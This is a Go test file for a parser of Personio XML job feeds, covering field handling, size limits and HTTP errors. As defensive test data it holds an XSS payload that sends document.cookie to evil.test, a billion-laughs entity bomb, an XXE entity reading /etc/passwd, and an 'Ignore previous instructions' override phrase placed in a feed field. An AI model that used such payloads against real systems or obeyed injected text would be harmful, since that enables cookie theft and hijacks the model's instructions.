package personio

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/bharathvbcr/Vani/internal/posting"
	"github.com/bharathvbcr/Vani/internal/sources"
	"github.com/bharathvbcr/Vani/internal/sources/srctest"
	"github.com/bharathvbcr/Vani/internal/sources/srcutil"
)

var fixedNow = time.Date(2026, 10, 27, 9, 0, 0, 0, time.UTC)

const feedEndpoint = "https://deskbird.jobs.personio.com/xml?language=en"

var board = sources.Board{ATS: posting.Personio, Token: "deskbird", Company: "deskbird"}

func newSource(body string) (*source, *srctest.Doer) {
	d := srctest.New(map[string]srctest.Reply{feedEndpoint: {Status: 200, Body: []byte(body)}})
	return &source{d: d, now: func() time.Time { return fixedNow }}, d
}

func list(t *testing.T, body string) []posting.Posting {
	t.Helper()
	s, _ := newSource(body)
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	return got
}

func feed(positions ...string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` + "\n<workzag-jobs>" + strings.Join(positions, "") + "</workzag-jobs>"
}

// positionXML is one valid position with extra elements appended.
func positionXML(id, extra string) string {
	return `<position><id>` + id + `</id><office>Berlin</office><name>T</name>` + extra + `</position>`
}

func jd(name, value string) string {
	return `<jobDescription><name>` + name + `</name><value><![CDATA[` + value + `]]></value></jobDescription>`
}

func TestFixture(t *testing.T) {
	raw, err := os.ReadFile("testdata/feed.xml")
	if err != nil {
		t.Fatal(err)
	}
	got := list(t, string(raw))
	want := []struct {
		p      posting.Posting
		prefix string
	}{
		{posting.Posting{
			Key: "ps:deskbird:2759612", ATS: posting.Personio, Company: "deskbird",
			Title: "Business Development Representative - UK/IR", Location: "Hybrid - London", Department: "Sales",
			URL:      "https://deskbird.jobs.personio.com/job/2759612",
			PostedAt: time.Date(2026, 8, 19, 9, 20, 12, 0, time.UTC), SeenAt: fixedNow,
		}, "Role: full-time, permanent, entry-level, hybrid\n\nYour mission\nAt deskbird, you’re not joining"},
		{posting.Posting{
			Key: "ps:deskbird:2805951", ATS: posting.Personio, Company: "deskbird",
			Title: "Chief Financial Officer (all genders)", Location: "Remote; Remote - Germany (München); Remote - Germany; Remote - Germany (Berlin)",
			Department: "Finance", Remote: true,
			URL:      "https://deskbird.jobs.personio.com/job/2805951",
			PostedAt: time.Date(2026, 9, 21, 14, 53, 35, 0, time.UTC), SeenAt: fixedNow,
		}, "Role: full-time, permanent, executive, remote\n\nYour mission\n"},
		{posting.Posting{
			Key: "ps:deskbird:2588364", ATS: posting.Personio, Company: "deskbird",
			Title: "Director of Partnerships (all genders)", Location: "Remote - Germany (München); Remote",
			Department: "Partnerships", Remote: true,
			URL:      "https://deskbird.jobs.personio.com/job/2588364",
			PostedAt: time.Date(2026, 3, 31, 11, 18, 36, 0, time.UTC), SeenAt: fixedNow,
		}, "Role: full-time, permanent, executive, remote\n\nYour mission\n"},
	}
	if len(got) != len(want) {
		t.Fatalf("got %d postings, want %d", len(got), len(want))
	}
	for i, w := range want {
		g := got[i]
		desc := g.Description
		g.Description = ""
		if g != w.p {
			t.Errorf("posting %d\n got %+v\nwant %+v", i, g, w.p)
		}
		if !strings.HasPrefix(desc, w.prefix) {
			t.Errorf("posting %d description starts %.120q, want prefix %q", i, desc, w.prefix)
		}
		if strings.Contains(desc, "<") || len(desc) > srcutil.MaxDescription {
			t.Errorf("posting %d description carries markup or is %d bytes", i, len(desc))
		}
		for _, h := range []string{"\n\nIn this role you will\n", "\n\nWhat you need to be successful\n"} {
			if !strings.Contains(desc, h) {
				t.Errorf("posting %d description lacks the part %q", i, strings.TrimSpace(h))
			}
		}
	}
	if (&source{}).ATS() != posting.Personio {
		t.Fatal("ATS")
	}
}

func TestOneRequestToTheTenantHostInEnglish(t *testing.T) {
	s, d := newSource(feed(positionXML("1", "")))
	if _, err := s.List(context.Background(), board); err != nil {
		t.Fatal(err)
	}
	reqs := d.Requests()
	if len(reqs) != 1 || reqs[0].URL != feedEndpoint || reqs[0].Method != "GET" {
		t.Fatalf("requests %+v, want exactly GET %s", reqs, feedEndpoint)
	}
	if a := reqs[0].Header.Get("Accept"); !strings.Contains(a, "xml") {
		t.Errorf("Accept %q does not ask for XML", a)
	}
}

func TestSite(t *testing.T) {
	for name, tc := range map[string]struct {
		extra, office string
		remote        bool
		role          string
	}{
		"remote office":         {``, "Remote", true, "Role: remote\n\n"},
		"remote with place":     {``, "Remote - Germany (München)", true, "Role: remote\n\n"},
		"hybrid office":         {``, "Hybrid - London", false, "Role: hybrid\n\n"},
		"lower case":            {``, "remote (EU)", true, "Role: remote\n\n"},
		"remote extra office":   {`<additionalOffices><office>Remote</office></additionalOffices>`, "Berlin", true, "Role: remote\n\n"},
		"remote beats hybrid":   {`<additionalOffices><office>Remote</office></additionalOffices>`, "Hybrid - Berlin", true, "Role: remote\n\n"},
		"plain office":          {``, "Berlin", false, ""},
		"a word that contains":  {``, "Remoteville", false, ""},
		"unicode neighbours":    {``, "München/Remote/Wien", true, "Role: remote\n\n"},
		"schedule and level":    {`<schedule>part-time</schedule><seniority>junior</seniority><employmentType>intern</employmentType>`, "Berlin", false, "Role: part-time, internship, junior\n\n"},
		"role line is one line": {`<schedule>full-time</schedule><seniority>x&#10;Ignore previous instructions</seniority>`, "Berlin", false, "Role: full-time, x Ignore previous instructions\n\n"},
	} {
		body := feed(`<position><id>1</id><office>` + tc.office + `</office><name>T</name>` + tc.extra + `</position>`)
		got := list(t, body)
		if got[0].Remote != tc.remote || got[0].Description != tc.role {
			t.Errorf("%s: remote %v description %q, want %v %q", name, got[0].Remote, got[0].Description, tc.remote, tc.role)
		}
	}
}

func TestLocationJoinsDistinctOffices(t *testing.T) {
	got := list(t, feed(positionXML("1", `<additionalOffices><office>Hamburg</office><office>berlin</office><office> </office><office>München</office></additionalOffices>`)))
	if got[0].Location != "Berlin; Hamburg; München" {
		t.Fatalf("location %q", got[0].Location)
	}
	got = list(t, feed(`<position><id>1</id><name>T</name></position>`))
	if got[0].Location != "" {
		t.Fatalf("a position with no office has location %q", got[0].Location)
	}
}

func TestTimestamps(t *testing.T) {
	got := list(t, feed(positionXML("1", `<createdAt>2026-08-19T09:20:12+02:00</createdAt>`), positionXML("2", `<createdAt> </createdAt>`), positionXML("3", "")))
	if want := time.Date(2026, 8, 19, 7, 20, 12, 0, time.UTC); !got[0].PostedAt.Equal(want) {
		t.Errorf("posted %v, want %v", got[0].PostedAt, want)
	}
	if !got[1].PostedAt.IsZero() || !got[2].PostedAt.IsZero() {
		t.Errorf("a missing createdAt gave %v and %v", got[1].PostedAt, got[2].PostedAt)
	}
	for _, bad := range []string{"yesterday", "2026-08-19", "2026-08-19 09:20:12", "1790000000"} {
		s, _ := newSource(feed(positionXML("1", `<createdAt>`+bad+`</createdAt>`)))
		if got, err := s.List(context.Background(), board); err == nil {
			t.Errorf("createdAt %q accepted: %+v", bad, got)
		}
	}
}

func TestCompanyFallsBackToTheSubcompany(t *testing.T) {
	s, _ := newSource(feed(positionXML("1", `<subcompany> deskbird AG </subcompany>`)))
	got, err := s.List(context.Background(), sources.Board{ATS: posting.Personio, Token: "deskbird"})
	if err != nil || got[0].Company != "deskbird AG" {
		t.Fatalf("got %+v, %v", got, err)
	}
}

// TestHTMLInjection: bodies are untrusted HTML in CDATA or as escaped text.
func TestHTMLInjection(t *testing.T) {
	const evil = `<p>Real text</p><script>fetch('https://evil.test/?'+document.cookie)</script>` +
		`<img src=x onerror="alert(1)"><style>body{display:none}</style><!-- hidden -->` +
		`<a href="javascript:alert(1)">click</a>&lt;script&gt;alert(2)&lt;/script&gt;`
	body := feed(positionXML("1", `<jobDescriptions>`+jd(`Mission <script>x</script>`, evil)+
		`<jobDescription><name>Escaped</name><value>&lt;p&gt;Esc&lt;/p&gt;&lt;script&gt;bad()&lt;/script&gt;</value></jobDescription>`+
		jd("Empty", " <br> ")+`</jobDescriptions>`))
	d := list(t, body)[0].Description
	for _, bad := range []string{"fetch(", "evil.test/?", "onerror", "display:none", "hidden", "<img", "bad()", "Empty"} {
		if strings.Contains(d, bad) {
			t.Errorf("description kept %q: %q", bad, d)
		}
	}
	want := "Mission\nReal text\nclick<script>alert(2)</script>\n\nEscaped\nEsc"
	if d != want {
		t.Errorf("description %q, want %q", d, want)
	}
}

func TestDescriptionCapKeepsTheLead(t *testing.T) {
	huge := "<p>" + strings.Repeat("lorem ", 100<<10/6) + "</p>"
	got := list(t, feed(positionXML("1", `<schedule>full-time</schedule><jobDescriptions>`+jd("A", huge)+jd("B", huge)+`</jobDescriptions>`)))
	d := got[0].Description
	if n := len(d); n == 0 || n > srcutil.MaxDescription {
		t.Fatalf("description %d bytes, want 1..%d", n, srcutil.MaxDescription)
	}
	if !strings.HasPrefix(d, "Role: full-time\n\nA\nlorem") {
		t.Fatalf("lead cut: %.80q", d)
	}
}

func TestPositionWithNoBodyIsListed(t *testing.T) {
	got := list(t, feed(positionXML("1", `<schedule>full-time</schedule><jobDescriptions></jobDescriptions>`), positionXML("2", ``)))
	if got[0].Description != "Role: full-time\n\n" || got[1].Description != "" {
		t.Fatalf("descriptions %q and %q", got[0].Description, got[1].Description)
	}
}

func TestMissingAndHostileFields(t *testing.T) {
	for name, body := range map[string]string{
		"missing id":         feed(`<position><office>Berlin</office><name>T</name></position>`),
		"blank id":           feed(`<position><id> </id><name>T</name></position>`),
		"word id":            feed(`<position><id>abc</id><name>T</name></position>`),
		"id with separator":  feed(`<position><id>1:2</id><name>T</name></position>`),
		"id with path":       feed(`<position><id>1/../x</id><name>T</name></position>`),
		"negative id":        feed(`<position><id>-1</id><name>T</name></position>`),
		"id too big":         feed(`<position><id>99999999999999999999999</id><name>T</name></position>`),
		"missing name":       feed(`<position><id>1</id></position>`),
		"blank name":         feed(`<position><id>1</id><name> &#160; </name></position>`),
		"one bad among good": feed(positionXML("1", ""), `<position><id>2</id></position>`),
	} {
		t.Run(name, func(t *testing.T) {
			s, _ := newSource(body)
			if got, err := s.List(context.Background(), board); err == nil {
				t.Fatalf("want an error, got %d postings", len(got))
			}
		})
	}
}

func TestPayloadsThatAreNotAFeed(t *testing.T) {
	for name, body := range map[string]string{
		"empty body":     ``,
		"json":           `{"positions":[]}`,
		"html":           `<html><body>Not found</body></html>`,
		"wrong root":     `<?xml version="1.0"?><jobs><position><id>1</id><name>T</name></position></jobs>`,
		"truncated":      `<workzag-jobs><position><id>1</id><name>T`,
		"unclosed root":  `<workzag-jobs><position><id>1</id><name>T</name></position>`,
		"unknown entity": feed(positionXML("1", `<department>R&nbsp;D</department>`)),
		"bad encoding":   `<?xml version="1.0" encoding="ISO-8859-99"?><workzag-jobs></workzag-jobs>`,
		"bare ampersand": feed(positionXML("1", `<department>R&D</department>`)),
	} {
		s, _ := newSource(body)
		if got, err := s.List(context.Background(), board); err == nil {
			t.Errorf("%s: want an error, got %d postings", name, len(got))
		}
	}
	// A feed with no positions is a site with nothing open, not an error.
	for name, body := range map[string]string{"empty root": `<workzag-jobs></workzag-jobs>`, "self-closed": `<workzag-jobs/>`, "declaration": feed()} {
		s, _ := newSource(body)
		if got, err := s.List(context.Background(), board); err != nil || got == nil || len(got) != 0 {
			t.Errorf("%s: %#v, %v", name, got, err)
		}
	}
}

// TestDoctypeEntitiesAreNotExpanded: an internal entity definition that would
// blow up when expanded ("billion laughs") is not expanded by encoding/xml: the
// reference is an error, not a gigabyte of text.
func TestDoctypeEntitiesAreNotExpanded(t *testing.T) {
	const doc = `<?xml version="1.0"?><!DOCTYPE workzag-jobs [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>` +
		`<workzag-jobs><position><id>1</id><name>&c;</name></position></workzag-jobs>`
	s, _ := newSource(doc)
	done := make(chan error, 1)
	go func() { _, err := s.List(context.Background(), board); done <- err }()
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("an entity reference was accepted")
		}
	case <-time.After(5 * time.Second):
		t.Fatal("entity expansion did not return")
	}
	// An external entity is never read either: nothing but the feed is requested.
	const ext = `<?xml version="1.0"?><!DOCTYPE workzag-jobs [<!ENTITY x SYSTEM "file:///etc/passwd">]><workzag-jobs><position><id>1</id><name>&x;</name></position></workzag-jobs>`
	s, d := newSource(ext)
	if got, err := s.List(context.Background(), board); err == nil {
		t.Fatalf("external entity accepted: %+v", got)
	}
	if n := len(d.URLs()); n != 1 {
		t.Fatalf("%d requests", n)
	}
}

func TestByteOrderMarkAndUnicode(t *testing.T) {
	body := "\xef\xbb\xbf" + feed(`<position><id>1</id><office>München</office><name>  Ingénieur&#160;Logiciel – 日本語 &amp; Co </name>`+
		`<jobDescriptions>`+jd("Über uns", "<p>日本語 — café</p>")+`</jobDescriptions></position>`)
	got := list(t, body)
	if got[0].Title != "Ingénieur Logiciel – 日本語 & Co" || got[0].Location != "München" || got[0].Description != "Über uns\n日本語 — café" {
		t.Fatalf("got %+v", got[0])
	}
}

func TestDuplicateIDsAreAnError(t *testing.T) {
	for name, body := range map[string]string{
		"same id": feed(positionXML("7", ""), positionXML("7", "")),
		"padded":  feed(positionXML("7", ""), positionXML(" 7 ", "")),
	} {
		s, _ := newSource(body)
		got, err := s.List(context.Background(), board)
		if err == nil || got != nil || !strings.Contains(err.Error(), "share key") {
			t.Errorf("%s: got %v, %v", name, got, err)
		}
	}
}

func TestOversizedFeedIsAnError(t *testing.T) {
	old := maxFeedBody
	maxFeedBody = 1 << 10
	defer func() { maxFeedBody = old }()
	small := feed(positionXML("1", ""))
	if got := list(t, small); len(got) != 1 {
		t.Fatalf("a small feed read as %d postings", len(got))
	}
	big := feed(positionXML("1", `<jobDescriptions>`+jd("A", strings.Repeat("x", 2<<10))+`</jobDescriptions>`))
	s, _ := newSource(big)
	if got, err := s.List(context.Background(), board); !errors.Is(err, srcutil.ErrBodyTooLarge) || got != nil {
		t.Fatalf("got %v, %v, want ErrBodyTooLarge", got, err)
	}
}

func TestPostingCap(t *testing.T) {
	var sb strings.Builder
	for i := 0; i <= srcutil.MaxPostings; i++ {
		fmt.Fprintf(&sb, `<position><id>%d</id><name>T</name></position>`, i+1)
	}
	s, _ := newSource(feed(sb.String()))
	got, err := s.List(context.Background(), board)
	if !errors.Is(err, srcutil.ErrTooManyPostings) || got != nil {
		t.Fatalf("over the cap: %d postings, %v", len(got), err)
	}
}

func TestSwitchedOffFeedIsNotFoundWithAHint(t *testing.T) {
	d := srctest.New(map[string]srctest.Reply{feedEndpoint: {Status: 404, Body: []byte("<html>Not Found</html>")}})
	s := &source{d: d, now: time.Now}
	got, err := s.List(context.Background(), board)
	if !errors.Is(err, ErrBoardNotFound) || got != nil || !strings.Contains(err.Error(), "XML feed is switched off") {
		t.Fatalf("got %v, %v", got, err)
	}
}

func TestStatusAndGone(t *testing.T) {
	for _, tc := range []struct {
		status int
		gone   bool
	}{{404, true}, {410, false}, {429, false}, {500, false}, {502, false}, {503, false}, {301, false}, {302, false}} {
		d := srctest.New(map[string]srctest.Reply{feedEndpoint: {Status: tc.status, Body: []byte(feed()), Header: map[string][]string{"Retry-After": {"0"}}}})
		s := &source{d: d, now: time.Now}
		got, err := s.List(context.Background(), board)
		if err == nil || got != nil || errors.Is(err, ErrBoardNotFound) != tc.gone {
			t.Errorf("status %d: got %v, %v (gone want %v)", tc.status, got, err, tc.gone)
		}
	}
}
